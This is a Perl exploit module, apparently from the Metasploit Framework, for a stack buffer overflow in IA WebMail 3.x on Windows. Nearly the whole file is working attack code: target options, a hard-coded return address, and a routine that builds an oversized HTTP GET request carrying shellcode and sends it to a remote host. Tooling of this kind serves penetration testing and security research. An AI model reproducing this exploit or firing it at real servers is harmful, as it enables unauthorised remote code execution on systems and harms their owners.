package Msf::Exploit::ia_webmail;
use base "Msf::Exploit";
use strict;

my $advanced = { };

my $info =
{
    'Name'  => 'IA WebMail 3.x Buffer Overflow',
    'Version'  => '$Revision: 1.12 $',
    'Authors' => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]', ],
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'win32' ],
    'Priv'  => 0,
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The target port', 80],
                },

    'Payload' => {
                 'Space'  => 1024,
                 'BadChars'  => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",
                 },
    
    'Description'  =>  qq{
        This exploits a stack overflow in the IA WebMail server. This
        exploit has not been tested against a live system at this time.
    },
    
    'Refs'  =>  [  
                    'http://www.osvdb.org/2757',
                    'http://www.k-otik.net/exploits/11.19.iawebmail.pl.php',
                ],
    'DefaultTarget' => 0,
    'Targets' => [['IA WebMail 3.x', 1036, 0x1002bd33]],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}


# This exploit based on http://www.k-otik.net/exploits/11.19.iawebmail.pl.php
sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_idx  = $self->GetVar('TARGET');
    my $shellcode   = $self->GetVar('EncodedPayload')->Payload;


    my @targets = @{$self->Targets};
    my $target = $targets[$target_idx];

    $self->PrintLine("[*] Attempting to exploit target " . $target->[0]);

    my $request = "GET /" . ("o" x $target->[1]) . "META" .
                  pack("V", $target->[2]). $shellcode .
                  " HTTP/1.0\r\n\r\n";
    
    my $s = Msf::Socket->new();
    if (! $s->Tcp($target_host, $target_port)) {
        $self->PrintLine("[*] Error: could not connect: " . $s->GetError());
        return;
    }

    $self->PrintLine("[*] Sending " .length($request) . " bytes to remote host.");
    $s->Send($request);

    $self->PrintLine("[*] Waiting for a response...");
    my $r = $s->Recv(-1, 5);
    sleep(2);
    $s->Close();
    return;
}
